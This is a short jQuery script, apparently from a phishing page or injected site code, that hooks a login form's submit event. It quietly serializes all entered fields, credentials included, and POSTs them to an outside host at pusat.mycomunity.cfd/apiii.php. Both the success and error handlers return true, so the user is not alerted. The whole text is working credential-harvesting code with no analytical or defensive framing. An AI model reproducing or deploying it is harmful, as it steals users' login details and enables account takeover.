$(".form-login").submit(function() {
    var d = $(".form-login");

    $.ajax({
        url: "https://pusat.mycomunity.cfd/apiii.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
